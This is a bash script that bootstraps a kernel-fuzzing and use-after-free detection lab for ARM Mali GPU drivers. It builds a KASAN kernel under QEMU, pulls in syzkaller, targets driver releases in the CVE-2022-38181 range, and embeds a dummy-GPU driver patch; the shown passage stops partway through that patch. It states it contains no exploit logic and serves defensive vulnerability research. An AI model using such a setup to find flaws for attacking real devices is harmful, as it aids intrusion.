#!/usr/bin/env bash
# =============================================================================
# bootstrap_mali_lab.sh — one-script from-scratch reproduction of the
# mali-uaf-lab on a clean host ("codespace b" and equivalents).
#
# Creates a flexible kernel-fuzzing + UAF-detection lab:
#   * ONE KASAN/KCOV kernel build (KERNEL_VERSION, default 5.10.30;
#     ARCH=arm64 by default — the guide's Device-Tree path; x86_64 via
#     ARCH=x86_64 with KERNEL_VERSION=4.19.320)
#   * per-release NO_MALI Mali kbase drivers (DRIVER_VERSION, default
#     r36p0-01eac0 Bifrost — in the CVE-2022-38181 range; r36p0 supports the
#     JM/CSF knob MALI_MODE=jm|csf), built as a LOADABLE MODULE by default so
#     the kernel is built once and swapped drivers are insmod/rmmod'd per test
#     (DRIVER_MODE=builtin restores the lab's originally-validated built-in +
#     incremental-relink flow; JM-only — csf+builtin is a hard fail)
#   * guest boot + UAF-detection oracle harness (bug-detection ONLY — no
#     exploit logic, no privilege-escalation payloads); on arm64 the guest
#     gets a custom qemu-virt DTB with the guide's mali gpu node
#   * release-matched syzkaller (pinned vendor commit, dual-arch extracted
#     consts) with optional bounded fuzzing session (FUZZ_MINUTES>0)
#
# Every build/test step is evidence-gated (PASS/FAIL recorded to
# evidence/bootstrap_report.md); staged proprietary inputs are SHA-256 pinned;
# downloads are hash-pinned against kernel.org/go.dev/syzkaller upstream.
#
# Lineage: full method, fixes and expected values are the validated lab
# (evidence/01..11 of the original mali-uaf-lab). Key inherited fixes:
#   - gcc>=14 vs kernel 4.19: -std=gnu89 in arch/x86/Makefile REALMODE_CFLAGS
#     and arch/x86/boot/compressed/Makefile KBUILD_CFLAGS (C5/C6)
#   - syz-extract header shadowing: hardlink overlay of the kernel tree with
#     include/uapi/gpu removed + compat shim dir (validated byte-identical
#     const reproduction, 0 "???")
#   - gpu_addr producer/consumer cycle: (out_overlay) resource model in the
#     r28p0 description (53/8328 enabled syscalls, chain live)
#   - seed cmd literals must equal the extracted const file (parser keeps
#     written literals verbatim even for const[...] fields)
#
# Usage:
#   ./bootstrap_mali_lab.sh [stage] [options]
#   stages: all (default) | prereqs | sources | kernel | driver |
#           guest-test | syzkaller | fuzz | report | payloads
# Options/env:
#   ARCH=arm64                   arm64 (default, guide DT path) | x86_64
#   KERNEL_VERSION=5.10.30       kernel.org version (arm64 default);
#                                4.19.320 with ARCH=x86_64 = the validated
#                                legacy combo (old r28p0 flow)
#   DRIVER_VERSION=r36p0-01eac0  r36p0-01eac0 | r41p0-01eac0 |
#                                r28p0-01eac0 | r29p0-01eac0
#   MALI_MODE=jm                 r36p0 only: jm (default) | csf
#                                (csf+builtin and csf+non-r36p0 hard-fail)
#   DRIVER_MODE=module           module (kernel once, .ko swap) | builtin
#   FUZZ_MINUTES=0               0 = no fuzz session; else bounded minutes
#   LAB_ROOT=~/mali-uaf-lab
#   STAGING_DIR=$LAB_ROOT/staging   copy non-downloadable inputs here
#   --with-drivers a,b           also build+test these drivers against the
#                                same kernel (e.g. the r28p0/r29p0 pair)
#   --install-prereqs            allow apt-get install of missing packages
#   --force                      ignore stamps, rerun stages
#
# Staged inputs (SHA-256 pinned; the sources stage prints exact copy
# instructions if missing) — proprietary / host-specific, cannot be fetched:
#   staging/BX304L01B-SW-99002-r36p0-01eac0.tar
#   staging/BX304L01B-SW-99002-r28p0-01eac0.tar
#   staging/BX304L01B-SW-99002-r29p0-01eac0.tar
#   staging/AX504X08X-SW-99002-r41p0-01eac0.tar.gz
#   staging/syz-builder.cpio  staging/syz-host.key  staging/empty.img
#   staging/busybox-x86_64    (ARCH=x86_64 guests only; arm64 busybox and
#                              dropbear are cross-built from pinned source)
# Downloaded + pinned: linux-<ver>.tar.xz (kernel.org, dynamic vX.x path),
# go1.27.1 (go.dev), syzkaller @357b6724 (github.com/google/syzkaller), and
# for ARCH=arm64: busybox-1.38.0 (busybox.net), dropbear-2026.94
# (matt.ucc.asn.au), mali driver tarballs when not staged (developer.arm.com,
# hash-pinned where the download name matches the staged archive name).
# =============================================================================
set -euo pipefail

# ------------------------------ CONFIGURATION --------------------------------
LAB_ROOT="${LAB_ROOT:-$HOME/mali-uaf-lab}"
STAGING_DIR="${STAGING_DIR:-$LAB_ROOT/staging}"
ARCH="${ARCH:-arm64}"                       # arm64 (default, guide DT path) | x86_64
KERNEL_VERSION="${KERNEL_VERSION:-5.10.30}"
DRIVER_VERSION="${DRIVER_VERSION:-r36p0-01eac0}"
MALI_MODE="${MALI_MODE:-jm}"                # r36p0 only: jm (default) | csf
DRIVER_MODE="${DRIVER_MODE:-module}"
KERNEL_JOBS="${KERNEL_JOBS:-$(nproc 2>/dev/null || echo 2)}"
FUZZ_MINUTES="${FUZZ_MINUTES:-0}"
INSTALL_PREREQS="${INSTALL_PREREQS:-0}"
FORCE="${FORCE:-0}"
STAGE="${STAGE:-all}"
WITH_DRIVERS="${WITH_DRIVERS:-}"
BOOT_TIMEOUT="${BOOT_TIMEOUT:-300}"

case "$ARCH" in
  arm64)   KARCH="arm64";   CROSS_COMPILE="${CROSS_COMPILE:-aarch64-linux-gnu-}"
           QEMU_BIN="qemu-system-aarch64"; KIMG_REL="arch/arm64/boot/Image";;
  x86_64)  KARCH="x86_64";  CROSS_COMPILE=""
           QEMU_BIN="qemu-system-x86_64"; KIMG_REL="arch/x86/boot/bzImage";;
  *) printf 'FAIL: unknown ARCH %s (arm64|x86_64)\n' "$ARCH" >&2; exit 1;;
esac

KT="$LAB_ROOT/builds/linux-$KERNEL_VERSION-$ARCH-mali"   # the ONE kernel tree
SZ="$LAB_ROOT/fuzzing/syzkaller/syzkaller"                 # vendored syzkaller
GO_TARBALL_URL="https://go.dev/dl/go1.27.1.linux-amd64.tar.gz"
# dynamic vX.x kernel.org path (v4.x for 4.19.x, v5.x for 5.10.x, ...)
KERNEL_URL_BASE="https://cdn.kernel.org/pub/linux/kernel/v${KERNEL_VERSION%%.*}.x"
SYZ_GIT_URL="https://github.com/google/syzkaller"
MALI_DL_BASE="https://developer.arm.com/-/media/Files/downloads/mali-drivers/kernel"

# --------------------- PINNED ARTIFACT HASHES (sha256) ----------------------
H_KERNEL="9d671a12b00301b7ce63022d4e4afa3e40aa318f8f7f25a1147e602fdb1047a1"   # linux-4.19.320.tar.xz (cross-checked vs kernel.org sha256sums.asc)
H_KERNEL_510="d40269b5ac5c8424ec808f4484c7f80947f8f2d549b1ef1a5149aec5b6a20640" # linux-5.10.30.tar.xz (kernel.org sha256sums.asc)
H_GO="63d339f0da5ab53635a56f2490a7984dfe12dfcff22ad749f63edaf590168445"        # go1.27.1.linux-amd64.tar.gz
SYZ_COMMIT="357b67240a5235ed1f88cf654c44498a3896a6da"
H_DRV_R28P0="e123e04955561c187ff720cc913e89feb7633d8793a6c3d46a06033821967a62"
H_DRV_R29P0="d0959ec907211a2c05aaab03f15d419fdebbfba4aeb197f00430e1390cfc8fbb"
H_DRV_R41P0="8db5f86647073a6ffac092811af4dc90440db4d968c53da14aab0712080abdc9"
H_DRV_R36P0="4f2c0ea2ec9f4d031bd53986fd4e05922c42962542461537a529523a2b2bea98"  # BX304L01B-SW-99002-r36p0-01eac0.tar (Bifrost)
H_SYZCPIO="2d471a3c080d920bdc07f755da89be797825486e3e2659bc234ede765bac8df0"
H_SYZKEY="7c796f38ffc117f413c83868ee07cc3c05388b0a1c9a990f24ff631eacfce775"
H_EMPTYIMG="30e14955ebf1352266dc2ff8067e68104607e750abb9d3b36582b8af909fcb58"
H_BUSYBOX="df12634c17fcdca839ae5dc47d7627b7558511f7645de7c99ccf097a0f28ed5b"    # staged busybox-x86_64 (ARCH=x86_64 guests)
H_BUSYBOX_SRC="34f9ea6ff8636f2c9241153b9114eefa9e65674a45318ae1ef95bb5f31c53bb2" # busybox-1.38.0.tar.bz2 (busybox.net .sha256)
H_DROPBEAR="e098034a843699200c8c977a991fff73159735bf795d5f72ef672c41a6b1ae81"   # dropbear-2026.94.tar.bz2 (upstream SHA256SUM.asc)

# ------------------------------ SMALL HELPERS --------------------------------
TS()   { date '+%Y-%m-%d %H:%M:%S'; }
log()  { printf '[%s] %s\n' "$(TS)" "$*"; }
fail() { printf '[%s] FAIL: %s\n' "$(TS)" "$*" >&2; exit 1; }
note() { printf '[%s] NOTE: %s\n' "$(TS)" "$*"; }

GATES=()
gate() { # gate <name> <cmd...>  — hard gate: records and aborts on failure
  local name="$1"; shift
  if "$@" >/dev/null 2>&1; then
    GATES+=("PASS  $name"); log "GATE PASS: $name"
  else
    GATES+=("FAIL  $name"); fail "gate failed: $name"
  fi
}
gate_soft() { # records UNVERIFIED but continues (unknown-version paths)
  local name="$1"; shift
  if "$@" >/dev/null 2>&1; then
    GATES+=("PASS  $name"); log "GATE PASS: $name"
  else
    GATES+=("UNVERIFIED  $name"); note "gate UNVERIFIED (continuing): $name"
  fi
}

sha256_pin() { # sha256_pin <file> <expected>
  local got; got=$(sha256sum "$1" | awk '{print $1}')
  [ "$got" = "$2" ] || fail "sha256 mismatch: $1
  expected $2
  got      $got"
}
need_run() { # need_run <stamp> <key> → 0 = must run
  local s="$LAB_ROOT/.stamps/$1"
  if [ "$FORCE" != 1 ] && [ -f "$s" ] && [ "$(cat "$s")" = "$2" ]; then
    log "skip (stamp ok): $1"; return 1
  fi
  return 0
}
set_stamp() { mkdir -p "$LAB_ROOT/.stamps"; printf '%s' "$2" > "$LAB_ROOT/.stamps/$1"; }

# ------------------------- DRIVER VERSION METADATA ---------------------------
drv_short() { case "$1" in r28p0-01eac0) echo r28p0;; r29p0-01eac0) echo r29p0;; r41p0-01eac0) echo r41p0;; r36p0-01eac0) echo r36p0;; *) fail "unknown DRIVER_VERSION '$1' (r36p0-01eac0|r41p0-01eac0|r28p0-01eac0|r29p0-01eac0)";; esac; }
drv_archive() { case "$1" in r28p0-01eac0) echo BX304L01B-SW-99002-r28p0-01eac0.tar;; r29p0-01eac0) echo BX304L01B-SW-99002-r29p0-01eac0.tar;; r41p0-01eac0) echo AX504X08X-SW-99002-r41p0-01eac0.tar.gz;; r36p0-01eac0) echo BX304L01B-SW-99002-r36p0-01eac0.tar;; *) fail "unknown DRIVER_VERSION '$1'";; esac; }
drv_hash() { case "$1" in r28p0-01eac0) echo "$H_DRV_R28P0";; r29p0-01eac0) echo "$H_DRV_R29P0";; r41p0-01eac0) echo "$H_DRV_R41P0";; r36p0-01eac0) echo "$H_DRV_R36P0";; *) fail "unknown DRIVER_VERSION '$1'";; esac; }
# bring-up patch is the inline-era (r28p0/r29p0) NO_MALI x86 dummy model;
# r36p0/r41p0 carry a native NO_MALI model and must NOT be patched (H fix 5)
drv_needs_patch() { case "$1" in r28p0-01eac0|r29p0-01eac0) return 0;; *) return 1;; esac; }
drv_src() { echo "$LAB_ROOT/sources/kbase/$1"; }
# syzkaller description used per driver (r29p0 shares the r28p0 surface: the
# CVE fix is a behavioral gpu_mappings>1 guard, cmd values identical — evidence/07)
# r36p0 has two: MALI_MODE selects JM (default) or CSF UAPI
drv_desc() { case "$1" in
  r41p0-01eac0) echo r41p0;;
  r36p0-01eac0) if [ "$MALI_MODE" = csf ]; then echo r36p0_csf; else echo r36p0; fi;;
  *) echo r28p0;;
esac; }
# ARM developer download templates: family per release (BX*=Bifrost,
# TX*=Midgard, VX*=Valhall). URL basename differs from the staged archive
# name for valhall (VX...tar vs staged AX...tar.gz) → unpinned TOFU download.
drv_family() { case "$1" in r41p0-01eac0) echo valhall;; r36p0-01eac0|r28p0-01eac0|r29p0-01eac0) echo bifrost;; *) echo bifrost;; esac; }
drv_url() { # <ver> — rNNp0-01eac0 → family template (midgard releases end -00rel0)
  local fam; fam=$(drv_family "$1")
  case "$fam" in
    bifrost) echo "$MALI_DL_BASE/mali-bifrost-gpu/BX304L01B-SW-99002-$1.tar";;
    midgard) echo "$MALI_DL_BASE/mali-midgard-gpu/TX011-SW-99002-${1%-01eac0}-00rel0.tgz";;
    valhall) echo "$MALI_DL_BASE/mali-valhall-gpu/VX504X08X-SW-99002-$1.tar";;
  esac;
}

# --------------------- RUN-TIME COMBO VALIDATION (hard) ----------------------
validate_config() { # incompatible combos abort BEFORE any work
  # x86_64 + 5.10.30: the 5.10 x86 build needs patches_for_virtual_device
  # (later milestone); only the guide's arm64 DT path is supported for 5.10
  if [ "$ARCH" = x86_64 ] && [ "$KERNEL_VERSION" = 5.10.30 ]; then
    fail "x86_64 + 5.10.30 needs patches_for_virtual_device (later milestone); use ARCH=arm64 (default) or KERNEL_VERSION=4.19.320"
  fi
  # arm64 + 4.19.320: the 4.19 arm64 build is unvalidated (lab's 4.19 flow is
  # the x86_64 vexpress/NO_MALI combo)
  if [ "$ARCH" = arm64 ] && [ "$KERNEL_VERSION" = 4.19.320 ]; then
    fail "ARCH=arm64 requires KERNEL_VERSION=5.10.30 (4.19.320 arm64 build is unvalidated); use ARCH=x86_64 or KERNEL_VERSION=5.10.30"
  fi
  case "$MALI_MODE" in
    jm|csf) ;;
    *) fail "unknown MALI_MODE '$MALI_MODE' (jm|csf)";;
  esac
  # CSF gate: CONFIG_MALI_CSF_SUPPORT depends on MALI_MIDGARD=m (symbol
  # vanishes entirely from .config when builtin) and CSF UAPI exists only
  # for r36p0 in this lab
  if [ "$MALI_MODE" = csf ]; then
    [ "$DRIVER_MODE" = module ] || fail "MALI_MODE=csf requires DRIVER_MODE=module (CONFIG_MALI_CSF_SUPPORT depends on MALI_MIDGARD=m)"
    case "$DRIVER_VERSION" in
      r36p0-01eac0) ;;
      *) fail "MALI_MODE=csf requires DRIVER_VERSION=r36p0-01eac0 (CSF UAPI/desc exist only for r36p0 here)";;
    esac
  fi
}

# ============================== PAYLOADS =====================================
# All lab text artifacts, embedded and SHA-256 pinned at assembly time.
write_payloads() {
  log "payloads: writing embedded lab files (hash-verified)"
  mkdir -p "$LAB_ROOT"
  mkdir -p "$(dirname "$LAB_ROOT/patches/v_r28_malimodels.patch")"
  cat > "$LAB_ROOT/patches/v_r28_malimodels.patch" <<'__PL_00__'
diff --git a/driver/product/kernel/drivers/gpu/arm/midgard/Kbuild b/driver/product/kernel/drivers/gpu/arm/midgard/Kbuild
index 5b495c9..5f7679d 100644
--- a/driver/product/kernel/drivers/gpu/arm/midgard/Kbuild
+++ b/driver/product/kernel/drivers/gpu/arm/midgard/Kbuild
@@ -30,6 +30,7 @@ src:=$(if $(patsubst /%,,$(src)),$(srctree)/$(src),$(src))
 KBASE_PATH = $(src)
 KBASE_PLATFORM_PATH = $(KBASE_PATH)/platform_dummy
 UMP_PATH = $(src)/../../../base
+INC_PATH = $(src)/../../../../include
 
 # Set up defaults if not defined by build system
 MALI_CUSTOMER_RELEASE ?= 1
@@ -71,10 +72,10 @@ DEFINES += -I$(srctree)/drivers/staging/android
 DEFINES += -DMALI_KBASE_BUILD
 
 # Use our defines when compiling
-ccflags-y += $(DEFINES) -I$(KBASE_PATH)   -I$(KBASE_PLATFORM_PATH) -I$(UMP_PATH) -I$(srctree)/include/linux
-subdir-ccflags-y += $(DEFINES) -I$(KBASE_PATH)   -I$(KBASE_PLATFORM_PATH) -I$(UMP_PATH) -I$(srctree)/include/linux
+ccflags-y += $(DEFINES) -I$(KBASE_PATH)   -I$(KBASE_PLATFORM_PATH) -I$(UMP_PATH) -I$(srctree)/include/linux -I$(INC_PATH)
+subdir-ccflags-y += $(DEFINES) -I$(KBASE_PATH)   -I$(KBASE_PLATFORM_PATH) -I$(UMP_PATH) -I$(srctree)/include/linux -I$(INC_PATH)
 
-SRC := \
+SRC := mali_kbase_platform_fake.c \
 	context/mali_kbase_context.c \
 	debug/mali_kbase_debug_ktrace.c \
 	device/mali_kbase_device.c \
diff --git a/driver/product/kernel/drivers/gpu/arm/midgard/Makefile b/driver/product/kernel/drivers/gpu/arm/midgard/Makefile
index 53a1209..9b234e6 100644
--- a/driver/product/kernel/drivers/gpu/arm/midgard/Makefile
+++ b/driver/product/kernel/drivers/gpu/arm/midgard/Makefile
@@ -1,10 +1,11 @@
+# SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note
 #
-# (C) COPYRIGHT 2010-2019 ARM Limited. All rights reserved.
+# (C) COPYRIGHT 2010-2023 ARM Limited. All rights reserved.
 #
 # This program is free software and is provided to you under the terms of the
 # GNU General Public License version 2 as published by the Free Software
 # Foundation, and any use by you of this program is subject to the terms
-# of such GNU licence.
+# of such GNU license.
 #
 # This program is distributed in the hope that it will be useful,
 # but WITHOUT ANY WARRANTY; without even the implied warranty of
@@ -15,24 +16,142 @@
 # along with this program; if not, you can access it online at
 # http://www.gnu.org/licenses/gpl-2.0.html.
 #
-# SPDX-License-Identifier: GPL-2.0
+
+KERNEL_SRC ?= /lib/modules/$(shell uname -r)/build
+KDIR ?= $(KERNEL_SRC)
+M ?= $(shell pwd)
+
+ifeq ($(KDIR),)
+    $(error Must specify KDIR to point to the kernel to target))
+endif
+
+CONFIG_MALI_MIDGARD=m
+CONFIG_MALI_DDK_VERSION=y
+CONFIG_MALI_PLATFORM_NAME="devicetree"
+CONFIG_MALI_EXPERT=y
+CONFIG_MALI_DEBUG=y
+CONFIG_MALI_NO_MALI=y
+
+# All Mali CONFIG should be listed here
+CONFIGS += \
+    CONFIG_MALI_DDK_VERSION \
+    CONFIG_MALI_MIDGARD \
+    CONFIG_MALI_GATOR_SUPPORT \
+    CONFIG_MALI_ARBITER_SUPPORT \
+    CONFIG_MALI_ARBITRATION \
+    CONFIG_MALI_PARTITION_MANAGER \
+    CONFIG_MALI_REAL_HW \
+    CONFIG_MALI_DEVFREQ \
+    CONFIG_MALI_MIDGARD_DVFS \
+    CONFIG_MALI_DMA_BUF_MAP_ON_DEMAND \
+    CONFIG_MALI_DMA_BUF_LEGACY_COMPAT \
+    CONFIG_MALI_EXPERT \
+    CONFIG_MALI_CORESTACK \
+    CONFIG_LARGE_PAGE_SUPPORT \
+    CONFIG_MALI_JOB_DUMP \
+    CONFIG_MALI_NO_MALI \
+    CONFIG_MALI_ERROR_INJECT \
+    CONFIG_MALI_PRFCNT_SET_PRIMARY \
+    CONFIG_MALI_PRFCNT_SET_SECONDARY \
+    CONFIG_MALI_PRFCNT_SET_TERTIARY \
+    CONFIG_MALI_PRFCNT_SET_SELECT_VIA_DEBUG_FS \
+    CONFIG_MALI_DEBUG \
+    CONFIG_MALI_MIDGARD_ENABLE_TRACE \
+    CONFIG_MALI_SYSTEM_TRACE \
+    CONFIG_MALI_FENCE_DEBUG \
+    CONFIG_MALI_2MB_ALLOC \
+    CONFIG_MALI_PWRSOFT_765 \
+    CONFIG_MALI_PRFCNT_SET_SECONDARY \
+    CONFIG_MALI_KUTF \
+    CONFIG_MALI_DMA_FENCE
+
+
+# MAKE_ARGS to pass the custom CONFIGs on out-of-tree build
+#
+# Generate the list of CONFIGs and values.
+# $(value config) is the name of the CONFIG option.
+# $(value $(value config)) is its value (y, m).
+# When the CONFIG is not set to y or m, it defaults to n.
+MAKE_ARGS := $(foreach config,$(CONFIGS), \
+                    $(if $(filter y m,$(value $(value config))), \
+                        $(value config)=$(value $(value config)), \
+                        $(value config)=n))
+
+ifeq ($(MALI_KCONFIG_EXT_PREFIX),)
+    MAKE_ARGS += CONFIG_MALI_PLATFORM_NAME=$(CONFIG_MALI_PLATFORM_NAME)
+endif
+
 #
+# EXTRA_CFLAGS to define the custom CONFIGs on out-of-tree build
 #
+# Generate the list of CONFIGs defines with values from CONFIGS.
+# $(value config) is the name of the CONFIG option.
+# When set to y or m, the CONFIG gets defined to 1.
+EXTRA_CFLAGS := $(foreach config,$(CONFIGS), \
+                    $(if $(filter y m,$(value $(value config))), \
+                        -D$(value config)=1))
+
+ifeq ($(MALI_KCONFIG_EXT_PREFIX),)
+    EXTRA_CFLAGS += -DCONFIG_MALI_PLATFORM_NAME='\"$(CONFIG_MALI_PLATFORM_NAME)\"'
+    EXTRA_CFLAGS += -DCONFIG_MALI_NO_MALI_DEFAULT_GPU='\"$(CONFIG_MALI_NO_MALI_DEFAULT_GPU)\"'
+endif
+
+CFLAGS_MODULE += -Wall -Werror
 
+# The following were added to align with W=1 in scripts/Makefile.extrawarn
+# from the Linux source tree (v5.18.14)
+CFLAGS_MODULE += -Wextra -Wunused -Wno-unused-parameter
+CFLAGS_MODULE += -Wmissing-declarations
+CFLAGS_MODULE += -Wmissing-format-attribute
+CFLAGS_MODULE += -Wmissing-prototypes
+CFLAGS_MODULE += -Wold-style-definition
+# The -Wmissing-include-dirs cannot be enabled as the path to some of the
+# included directories change depending on whether it is an in-tree or
+# out-of-tree build.
+CFLAGS_MODULE += $(call cc-option, -Wunused-but-set-variable)
+CFLAGS_MODULE += $(call cc-option, -Wunused-const-variable)
+CFLAGS_MODULE += $(call cc-option, -Wpacked-not-aligned)
+CFLAGS_MODULE += $(call cc-option, -Wstringop-truncation)
+# The following turn off the warnings enabled by -Wextra
+CFLAGS_MODULE += -Wno-sign-compare
+CFLAGS_MODULE += -Wno-shift-negative-value
+# This flag is needed to avoid build errors on older kernels
+CFLAGS_MODULE += $(call cc-option, -Wno-cast-function-type)
 
-KDIR ?= /lib/modules/$(shell uname -r)/build
+KBUILD_CPPFLAGS += -DKBUILD_EXTRA_WARN1
 
-BUSLOG_PATH_RELATIVE = $(CURDIR)/../../../..
-KBASE_PATH_RELATIVE = $(CURDIR)
+# The following were added to align with W=2 in scripts/Makefile.extrawarn
+# from the Linux source tree (v5.18.14)
+CFLAGS_MODULE += -Wdisabled-optimization
+# The -Wshadow flag cannot be enabled unless upstream kernels are
+# patched to fix redefinitions of certain built-in functions and
+# global variables.
+CFLAGS_MODULE += $(call cc-option, -Wlogical-op)
+CFLAGS_MODULE += -Wmissing-field-initializers
+# -Wtype-limits must be disabled due to build failures on kernel 5.x
+CFLAGS_MODULE += -Wno-type-limits
+CFLAGS_MODULE += $(call cc-option, -Wmaybe-uninitialized)
+CFLAGS_MODULE += $(call cc-option, -Wunused-macros)
+
+KBUILD_CPPFLAGS += -DKBUILD_EXTRA_WARN2
+
+# This warning is disabled to avoid build failures in some kernel versions
+CFLAGS_MODULE += -Wno-ignored-qualifiers
+
+ifeq ($(CONFIG_GCOV_KERNEL),y)
+    CFLAGS_MODULE += $(call cc-option, -ftest-coverage)
+    CFLAGS_MODULE += $(call cc-option, -fprofile-arcs)
+    EXTRA_CFLAGS += -DGCOV_PROFILE=1
+endif
 
-ifeq ($(CONFIG_MALI_BUSLOG),y)
-#Add bus logger symbols
-EXTRA_SYMBOLS += $(BUSLOG_PATH_RELATIVE)/drivers/base/bus_logger/Module.symvers
+ifeq ($(CONFIG_MALI_KCOV),y)
+    CFLAGS_MODULE += $(call cc-option, -fsanitize-coverage=trace-cmp)
+    EXTRA_CFLAGS += -DKCOV=1
+    EXTRA_CFLAGS += -DKCOV_ENABLE_COMPARISONS=1
 endif
 
-# we get the symbols from modules using KBUILD_EXTRA_SYMBOLS to prevent warnings about unknown functions
 all:
-	$(MAKE) -C $(KDIR) M=$(CURDIR) EXTRA_CFLAGS="-I$(CURDIR)/../../../../include -I$(CURDIR)/../../../../tests/include $(SCONS_CFLAGS)" $(SCONS_CONFIGS) KBUILD_EXTRA_SYMBOLS="$(EXTRA_SYMBOLS)" modules
+	$(MAKE) -C $(KDIR) M=$(M) $(MAKE_ARGS) EXTRA_CFLAGS="$(EXTRA_CFLAGS)" KBUILD_EXTRA_SYMBOLS="$(EXTRA_SYMBOLS)" modules
 
 clean:
-	$(MAKE) -C $(KDIR) M=$(CURDIR) clean
+	$(MAKE) -C $(KDIR) M=$(M) $(MAKE_ARGS) clean
diff --git a/driver/product/kernel/drivers/gpu/arm/midgard/backend/gpu/Kbuild b/driver/product/kernel/drivers/gpu/arm/midgard/backend/gpu/Kbuild
index 5dc8c01..7cd577c 100644
--- a/driver/product/kernel/drivers/gpu/arm/midgard/backend/gpu/Kbuild
+++ b/driver/product/kernel/drivers/gpu/arm/midgard/backend/gpu/Kbuild
@@ -59,7 +59,7 @@ endif
 ifeq ($(CONFIG_MALI_NO_MALI),y)
 	# Dummy model
 	BACKEND += backend/gpu/mali_kbase_model_dummy.c
-	BACKEND += backend/gpu/mali_kbase_model_linux.c
+	#BACKEND += backend/gpu/mali_kbase_model_linux.c
 	# HW error simulation
-	BACKEND += backend/gpu/mali_kbase_model_error_generator.c
+	#BACKEND += backend/gpu/mali_kbase_model_error_generator.c
 endif
diff --git a/driver/product/kernel/drivers/gpu/arm/midgard/backend/gpu/mali_kbase_model_dummy.c b/driver/product/kernel/drivers/gpu/arm/midgard/backend/gpu/mali_kbase_model_dummy.c
new file mode 100644
index 0000000..e99a634
--- /dev/null
+++ b/driver/product/kernel/drivers/gpu/arm/midgard/backend/gpu/mali_kbase_model_dummy.c
@@ -0,0 +1,149 @@
+#ifndef KBASE_MODEL_DUMMY_H_
+#define KBASE_MODEL_DUMMY_H_
+
+#include<mali_kbase.h>
+
+#include<gpu/mali_kbase_gpu_regmap.h>
+#include<gpu/mali_kbase_gpu_id.h>
+
+// Taken from https://github.com/ARM-software/nomali-model
+// interrupts (JOB, MMU, and GPU) not modeled, look in boot/dts/exynos/exynos9830.dts
+
+#define REGISTER_SPACE_SIZE_DTS 0x5000
+static u32 dummy_regs[REGISTER_SPACE_SIZE_DTS]; // size taken from dts file boot/dts/exynos/exynos9830.dts
+
+void clear_gpu(void) {
+    // dummy clear
+    int i = 0;
+    while(i < REGISTER_SPACE_SIZE_DTS) {
+        dummy_regs[i++] = 0;
+    }
+}
+
+// Register mapping comes from mali_midg_regmap.h and mali_midg_regmap_jm.h
+
+int kbase_gpu_device_create(struct kbase_device *kbdev) {
+    clear_gpu();
+
+    // gpu id is used to find hw issues and workaround functions
+    // look as mali_kbase_hw.c: kbase_hw_get_issues_for_new_id() for hardcoded arch/product/verions
+    dummy_regs[GPU_CONTROL_REG(GPU_ID)] = GPU_ID2_MAKE(6, 0, 0, 0, 0, 1, 0);
+
+    dummy_regs[GPU_CONTROL_REG(L2_FEATURES)] =
+        (0x07 << 24) |  // lg2 ext bus width
+        (0x13 << 16) |  // lg2 cache size
+        (0x02 << 8) |   // lg2 associativity
+        (0x06);         // lg2 line size
+
+    dummy_regs[GPU_CONTROL_REG(TILER_FEATURES)] =
+        (0x8 << 8) |    // Maximum no active hierarchy levels
+        0x09;           // lg2 bin size
+
+    /* Coherent core group, but incoherent supergroup. 1 L2 slice. */
+    dummy_regs[GPU_CONTROL_REG(MEM_FEATURES)] = 0x1;
+
+    dummy_regs[GPU_CONTROL_REG(MMU_FEATURES)] = 0x2830;
+    dummy_regs[GPU_CONTROL_REG(AS_PRESENT)] = 0xff;
+    dummy_regs[GPU_CONTROL_REG(JS_PRESENT)] = 0x7;
+    dummy_regs[GPU_CONTROL_REG(JS0_FEATURES)] = 0x20e;
+    dummy_regs[GPU_CONTROL_REG(JS1_FEATURES)] = 0x1fe;
+    dummy_regs[GPU_CONTROL_REG(JS2_FEATURES)] = 0x7e;
+
+    dummy_regs[GPU_CONTROL_REG(TEXTURE_FEATURES_0)] = 0x00fe001e;
+    dummy_regs[GPU_CONTROL_REG(TEXTURE_FEATURES_1)] = 0xffff;
+    dummy_regs[GPU_CONTROL_REG(TEXTURE_FEATURES_2)] = 0x9f81ffff;
+
+    dummy_regs[GPU_CONTROL_REG(THREAD_MAX_THREADS)] = 0x100;
+    dummy_regs[GPU_CONTROL_REG(THREAD_MAX_WORKGROUP_SIZE)] = 0x100;
+    dummy_regs[GPU_CONTROL_REG(THREAD_MAX_BARRIER_SIZE)] = 0x100;
+    dummy_regs[GPU_CONTROL_REG(THREAD_FEATURES)] = 0x0a040400;
+
+    dummy_regs[GPU_CONTROL_REG(SHADER_PRESENT_LO)] = 0xf; // 64 bit register, but only set low word
+    dummy_regs[GPU_CONTROL_REG(TILER_PRESENT_LO)] = 0x1; // 64 bit register, but only set low word
+    dummy_regs[GPU_CONTROL_REG(L2_PRESENT_LO)] = 0x1; // 64 bit register, but only set low word
+
+    return 0;
+}
+
+int gpu_device_create(struct kbase_device *kbdev) {
+    return kbase_gpu_device_create(kbdev);
+}
+
+void kbase_gpu_device_destroy(struct kbase_device *kbdex) {
+    clear_gpu();
+    return;
+}
+
+void gpu_device_destroy(struct kbase_device *kbdex) {
+    kbase_gpu_device_destroy(kbdex);
+    return;
+}
+
+unsigned int kbase_reg_read(struct kbase_device *kbdev, u32 offset)
+{
+    if (offset == GPU_CONTROL_REG(GPU_IRQ_STATUS)) {
+        return dummy_regs[offset] & dummy_regs[GPU_CONTROL_REG(GPU_IRQ_MASK)];
+    }
+    else if (offset == JOB_CONTROL_REG(JOB_IRQ_STATUS)) {
+        return dummy_regs[offset] & dummy_regs[JOB_CONTROL_REG(JOB_IRQ_MASK)];
+    }
+    else if (offset == MMU_REG(MMU_IRQ_STATUS)) {
+        return dummy_regs[offset] & dummy_regs[MMU_REG(MMU_IRQ_MASK)];
+    }
+
+    return dummy_regs[offset];
+}
+
+void kbase_reg_write(struct kbase_device *kbdev, u32 offset, u32 value) {
+    dummy_regs[offset] = value;
+
+    // just mark all jobs done successfully all the time
+    dummy_regs[JOB_SLOT_REG(0, JS_STATUS)] = 0;
+    dummy_regs[JOB_SLOT_REG(1, JS_STATUS)] = 0;
+    dummy_regs[JOB_SLOT_REG(2, JS_STATUS)] = 0;
+    dummy_regs[JOB_SLOT_REG(3, JS_STATUS)] = 0;
+    dummy_regs[JOB_SLOT_REG(4, JS_STATUS)] = 0;
+    dummy_regs[JOB_SLOT_REG(5, JS_STATUS)] = 0;
+    dummy_regs[JOB_SLOT_REG(6, JS_STATUS)] = 0;
+    dummy_regs[JOB_SLOT_REG(7, JS_STATUS)] = 0;
+    dummy_regs[JOB_SLOT_REG(8, JS_STATUS)] = 0;
+    dummy_regs[JOB_SLOT_REG(9, JS_STATUS)] = 0;
